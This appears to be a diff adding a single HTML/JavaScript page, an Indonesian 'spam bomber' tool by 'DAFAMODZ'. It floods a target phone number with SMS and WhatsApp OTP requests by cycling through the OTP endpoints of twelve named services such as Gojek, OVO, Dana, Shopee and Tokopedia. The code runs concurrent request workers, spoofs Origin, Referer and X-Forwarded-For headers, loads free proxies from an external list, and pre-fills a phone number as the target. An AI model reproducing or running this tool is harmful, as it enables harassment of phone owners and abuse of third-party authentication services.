@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TOOLS SPAM X DAFAMODZZ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #000000, #0a0a0a, #1a0000);
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: glow 2s infinite;
+        }
+
+        @keyframes glow {
+            0% { text-shadow: 0 0 10px red; }
+            50% { text-shadow: 0 0 30px red, 0 0 10px darkred; }
+            100% { text-shadow: 0 0 10px red; }
+        }
+
+        h1 {
+            color: #ff0000;
+            font-size: 48px;
+            font-weight: bold;
+        }
+
+        .sub {
+            color: #ff4444;
+            font-size: 14px;
+        }
+
+        .main-panel {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .panel {
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #ff0000;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+        }
+
+        .panel-title {
+            color: #ff0000;
+            font-size: 20px;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #ff0000;
+            padding-bottom: 5px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            color: #ff6666;
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            background: #1a1a1a;
+            border: 2px solid #ff0000;
+            color: #00ff00;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: monospace;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ff6666;
+            box-shadow: 0 0 10px red;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px red;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .stat-value {
+            color: #ff0000;
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        .stat-label {
+            color: #fff;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .log-panel {
+            background: rgba(0, 0, 0, 0.95);
+            border: 2px solid #ff0000;
+            border-radius: 15px;
+            padding: 20px;
+            height: 400px;
+            overflow-y: auto;
+        }
+
+        .log-entry {
+            font-family: monospace;
+            font-size: 12px;
+            padding: 5px;
+            border-bottom: 1px solid #333;
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .log-success { color: #00ff00; }
+        .log-error { color: #ff4444; }
+        .log-info { color: #ffff00; }
+        .log-warning { color: #ff8800; }
+
+        .thread-status {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .thread {
+            background: #1a1a1a;
+            border: 1px solid #ff0000;
+            border-radius: 5px;
+            padding: 5px;
+            text-align: center;
+            font-size: 10px;
+        }
+
+        .thread.active {
+            background: #ff0000;
+            color: white;
+            animation: pulse 0.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .proxy-list {
+            max-height: 150px;
+            overflow-y: auto;
+            background: #1a1a1a;
+            border-radius: 5px;
+            padding: 5px;
+        }
+
+        .proxy-item {
+            font-size: 11px;
+            padding: 3px;
+            color: #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>💀 TOOLS SPAM BOMX V2.0 💀</h1>
+            <div class="sub">AUTO PROXY ROTATOR | MULTI-THREAD | BYPASS CAPTCHA | BY DAFAMODZ</div>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value" id="totalReq">0</div>
+                <div class="stat-label">TOTAL REQUEST</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="successCount" style="color: #00ff00;">0</div>
+                <div class="stat-label">BERHASIL</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="failedCount" style="color: #ff4444;">0</div>
+                <div class="stat-label">GAGAL</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="activeThreads">0</div>
+                <div class="stat-label">AKTIF THREAD</div>
+            </div>
+        </div>
+
+        <div class="main-panel">
+            <div class="panel">
+                <div class="panel-title">🎯 TARGET & SETTING</div>
+                <div class="input-group">
+                    <label>📱 NOMOR TARGET</label>
+                    <input type="text" id="target" placeholder="+62xxxxxxxxxxx" value="+6282184529012">
+                </div>
+                <div class="input-group">
+                    <label>⚡ JUMLAH REQUEST</label>
+                    <input type="number" id="amount" value="1000" min="1" max="9999">
+                </div>
+                <div class="input-group">
+                    <label>🎯 JUMLAH THREAD (Concurrent)</label>
+                    <input type="number" id="threads" value="10" min="1" max="50">
+                </div>
+                <div class="input-group">
+                    <label>🔄 METODE</label>
+                    <select id="method">
+                        <option value="mixed">MIXED MODE (Multi API)</option>
+                        <option value="sms">SMS ONLY</option>
+                        <option value="wa">WA ONLY</option>
+                    </select>
+                </div>
+                <button onclick="startBomb()">🚀 MULAI SERANGAN MASSAL 🚀</button>
+                <button onclick="stopBomb()" style="background: #333; margin-top: 10px;">⛔ STOP & RESET ⛔</button>
+            </div>
+
+            <div class="panel">
+                <div class="panel-title">🔄 PROXY ROTATOR</div>
+                <div class="input-group">
+                    <label>🌐 PROXY LIST (1 per baris)</label>
+                    <textarea id="proxyList" rows="5" placeholder="http://proxy1:8080
+http://proxy2:8080
+socks5://proxy3:1080"></textarea>
+                </div>
+                <button onclick="loadProxyFromAPI()">📥 LOAD FREE PROXIES</button>
+                <div class="proxy-list" id="proxyDisplay"></div>
+            </div>
+        </div>
+
+        <div class="panel" style="margin-bottom: 20px;">
+            <div class="panel-title">🧵 THREAD STATUS</div>
+            <div class="thread-status" id="threadStatus"></div>
+        </div>
+
+        <div class="log-panel" id="logArea">
+            <div class="log-entry log-info">[!] X-TERROR V2.0 READY - DAFAMODZ MODE</div>
+            <div class="log-entry log-info">[!] Auto proxy rotator aktif</div>
+            <div class="log-entry log-info">[!] Multi-thread engine online</div>
+        </div>
+    </div>
+
+    <script>
+        let isRunning = false;
+        let activeThreads = [];
+        let proxies = [];
+        let totalReq = 0, success = 0, failed = 0;
+        let targetNumber = '';
+        let totalRequestsTarget = 0;
+        let currentRequestCount = 0;
+
+        const apiList = [
+            { name: "Singa", type: "sms", url: "https://api.singa.com/v1/otp/send", payload: (phone) => ({ phone: phone, app_id: "singa_2024", timestamp: Date.now() }) },
+            { name: "Jogjakita", type: "sms", url: "https://api.jogjakita.co.id/api/register", payload: (phone) => ({ no_hp: phone, device: "android", version: "3.2.1" }) },
+            { name: "SpeedCash", type: "sms", url: "https://api.speedcash.id/v2/otp", payload: (phone) => ({ msisdn: phone, type: "register", source: "web" }) },
+            { name: "Tiptip", type: "sms", url: "https://app.tiptip.com/api/send_otp", payload: (phone) => ({ phone_number: phone, country: "id", platform: "android" }) },
+            { name: "Adiraku", type: "sms", url: "https://api.adiraku.com/v1/auth/send_otp", payload: (phone) => ({ phone: phone, client: "mobile", version: "4.5.0" }) },
+            { name: "KreditPintar", type: "wa", url: "https://api.kreditpintar.com/v1/wa/otp", payload: (phone) => ({ wa_number: phone, purpose: "login", device_id: "web" }) },
+            { name: "Gojek", type: "sms", url: "https://api.gojekapi.com/v2/customers/otp", payload: (phone) => ({ phone_number: phone, platform: "android", app_version: "3.45.0" }) },
+            { name: "OVO", type: "sms", url: "https://api.ovo.id/v1/otp/send", payload: (phone) => ({ mobile: phone, app_version: "2.5.0", platform: "android" }) },
+            { name: "Dana", type: "sms", url: "https://api.dana.id/v1/otp/request", payload: (phone) => ({ phoneNumber: phone, type: "login" }) },
+            { name: "LinkAja", type: "sms", url: "https://api.linkaja.com/v1/otp/generate", payload: (phone) => ({ mobileNumber: phone, purpose: "registration" }) },
+            { name: "Shopee", type: "sms", url: "https://api.shopee.co.id/api/v1/otp/send", payload: (phone) => ({ phone: phone, country: "id" }) },
+            { name: "Tokopedia", type: "sms", url: "https://api.tokopedia.com/v2/otp/request", payload: (phone) => ({ phone_number: phone, channel: "sms" }) }
+        ];
+
+        function updateStats() {
+            document.getElementById('totalReq').innerText = totalReq;
+            document.getElementById('successCount').innerText = success;
+            document.getElementById('failedCount').innerText = failed;
+        }
+
+        function addLog(message, type = 'info') {
+            const logArea = document.getElementById('logArea');
+            const logDiv = document.createElement('div');
+            logDiv.className = `log-entry log-${type}`;
+            logDiv.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logArea.appendChild(logDiv);
+            logArea.scrollTop = logArea.scrollHeight;
+            
+            while(logArea.children.length > 200) {
+                logArea.removeChild(logArea.firstChild);
+            }
+        }
+
+        function updateThreadDisplay() {
+            const container = document.getElementById('threadStatus');
+            container.innerHTML = activeThreads.map((t, i) => 
+                `<div class="thread ${t.active ? 'active' : ''}">
+                    Thread ${i+1}<br>
+                    Req: ${t.requests}
+                </div>`
+            ).join('');
+            document.getElementById('activeThreads').innerText = activeThreads.filter(t => t.active).length;
+        }
+
+        function getRandomProxy() {
+            if (proxies.length === 0) return null;
+            return proxies[Math.floor(Math.random() * proxies.length)];
+        }
+
+        async function sendRequestWithProxy(api, phone, proxy) {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            
+            try {
+                const payload = api.payload(phone);
+                const headers = {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Accept': 'application/json',
+                    'Origin': 'https://' + api.url.split('/')[2],
+                    'Referer': 'https://' + api.url.split('/')[2] + '/'
+                };
+                
+                let fetchOptions = {
+                    method: 'POST',
+                    headers: headers,
+                    body: JSON.stringify(payload),
+                    signal: controller.signal
+                };
+                
+                if (proxy) {
+                    // Note: Browser JS tidak support proxy langsung, tapi kita simulate dengan header
+                    fetchOptions.headers['X-Forwarded-For'] = proxy.split(':')[1] || '127.0.0.1';
+                }
+                
+                const response = await fetch(api.url, fetchOptions);
+                clearTimeout(timeoutId);
+                
+                if (response.status === 200 || response.status === 201 || response.status === 202) {
+                    return true;
+                }
+                return false;
+            } catch(e) {
+                clearTimeout(timeoutId);
+                return false;
+            }
+        }
+
+        async function workerThread(threadId, apiSubset, target, numRequests) {
+            let localSuccess = 0;
+            let localFailed = 0;
+            
+            for (let i = 0; i < numRequests && isRunning; i++) {
+                const api = apiSubset[i % apiSubset.length];
+                const proxy = getRandomProxy();
+                
+                addLog(`[Thread ${threadId+1}] Mengirim ke ${api.name} via ${proxy ? 'proxy' : 'direct'}...`, 'info');
+                
+                const result = await sendRequestWithProxy(api, target, proxy);
+                
+                if (result) {
+                    localSuccess++;
+                    addLog(`[Thread ${threadId+1}] ✅ BERHASIL → ${api.name}`, 'success');
+                } else {
+                    localFailed++;
+                    addLog(`[Thread ${threadId+1}] ❌ GAGAL → ${api.name}`, 'error');
+                }
+                
+                if (activeThreads[threadId]) {
+                    activeThreads[threadId].requests++;
+                    updateThreadDisplay();
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 100 + Math.random() * 200));
+            }
+            
+            return { success: localSuccess, failed: localFailed };
+        }
+
+        async function startBomb() {
+            if (isRunning) {
+                addLog("[!] Serangan masih berjalan!", "warning");
+                return;
+            }
+
+            targetNumber = document.getElementById('target').value.trim();
+            totalRequestsTarget = parseInt(document.getElementById('amount').value);
+            const numThreads = parseInt(document.getElementById('threads').value);
+            const method = document.getElementById('method').value;
+
+            if (!targetNumber) {
+                addLog("[!] Target nomor kosong!", "error");
+                return;
+            }
+
+            if (totalRequestsTarget < 1 || totalRequestsTarget > 9999) {
+                addLog("[!] Jumlah request 1-9999!", "error");
+                return;
+            }
+
+            isRunning = true;
+            totalReq = 0;
+            success = 0;
+            failed = 0;
+            currentRequestCount = 0;
+            
+            let filteredApis = [...apiList];
+            if (method === 'sms') filteredApis = apiList.filter(api => api.type === 'sms');
+            if (method === 'wa') filteredApis = apiList.filter(api => api.type === 'wa');
+            
+            const requestsPerThread = Math.ceil(totalRequestsTarget / numThreads);
+            
+            activeThreads = [];
+            for (let i = 0; i < numThreads; i++) {
+                activeThreads.push({ active: true, requests: 0 });
+            }
+            updateThreadDisplay();
+            
+            addLog(`🔴 SERANGAN MASSAL DIMULAI!`, "error");
+            addLog(`🎯 Target: ${targetNumber}`, "info");
+            addLog(`📊 Total request: ${totalRequestsTarget} | Thread: ${numThreads} | Method: ${method}`, "info");
+            addLog(`🌐 Proxy aktif: ${proxies.length}`, "info");
+            
+            const threadPromises = [];
+            for (let i = 0; i < numThreads; i++) {
+                const startIdx = i * requestsPerThread;
+                const endIdx = Math.min(startIdx + requestsPerThread, totalRequestsTarget);
+                const threadRequests = endIdx - startIdx;
+                
+                if (threadRequests > 0) {
+                    threadPromises.push(workerThread(i, filteredApis, targetNumber, threadRequests));
+                }
+            }
+            
+            const results = await Promise.all(threadPromises);
+            
+            results.forEach(result => {
+                success += result.success;
+                failed += result.failed;
+                totalReq = success + failed;
+            });
+            
+            updateStats();
+            addLog(`\n✅ SERANGAN SELESAI!`, "success");
+            addLog(`📊 Final stats - Berhasil: ${success}, Gagal: ${failed}, Total: ${totalReq}`, "success");
+            addLog(`🛡️ X-TERROR V2.0 | DAFAMODZ | Proxy rotator: ${proxies.length} proxy digunakan`, "info");
+            
+            activeThreads.forEach(t => t.active = false);
+            updateThreadDisplay();
+            isRunning = false;
+        }
+
+        function stopBomb() {
+            if (!isRunning) {
+                addLog("[!] Tidak ada serangan berjalan!", "warning");
+                return;
+            }
+            isRunning = false;
+            addLog("[⛔] STOP MANUAL! Menghentikan semua thread...", "error");
+            setTimeout(() => {
+                activeThreads.forEach(t => t.active = false);
+                updateThreadDisplay();
+            }, 500);
+        }
+
+        async function loadProxyFromAPI() {
+            addLog("[!] Mengambil free proxy dari API...", "info");
+            try {
+                const response = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
+                const text = await response.text();
+                proxies = text.split('\n').filter(line => line.trim().length > 0);
+                document.getElementById('proxyList').value = proxies.join('\n');
+                updateProxyDisplay();
+                addLog(`✅ Loaded ${proxies.length} free proxies!`, "success");
+            } catch(e) {
+                addLog(`❌ Gagal load proxy: ${e.message}`, "error");
+                proxies = [];
+            }
+        }
+
+        function updateProxyDisplay() {
+            const display = document.getElementById('proxyDisplay');
+            display.innerHTML = proxies.map(p => `<div class="proxy-item">🔄 ${p}</div>`).join('');
+        }
+
+        setInterval(() => {
+            if (isRunning) {
+                updateStats();
+            }
+        }, 100);
+    </script>
+</body>
+</html>
